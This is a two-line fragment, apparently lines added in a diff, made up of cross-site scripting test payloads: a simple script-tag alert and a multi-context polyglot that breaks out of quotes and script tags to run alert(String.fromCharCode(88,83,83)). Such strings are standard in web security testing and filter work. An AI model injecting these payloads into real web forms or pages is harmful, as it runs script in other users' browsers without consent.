+foo < script > alert ( 1 ) < /script >
+' ; alert ( String.fromCharCode ( 88,83,83 ) ) //\ ' ; alert ( String.fromCharCode ( 88,83,83 ) ) // " ; alert ( String.fromCharCode ( 88,83,83 ) ) //\ " ; alert ( String.fromCharCode ( 88,83,83 ) ) // -- > < /SCRIPT > " > ' > < SCRIPT > alert ( String.fromCharCode ( 88,83,83 ) ) < /SCRIPT >
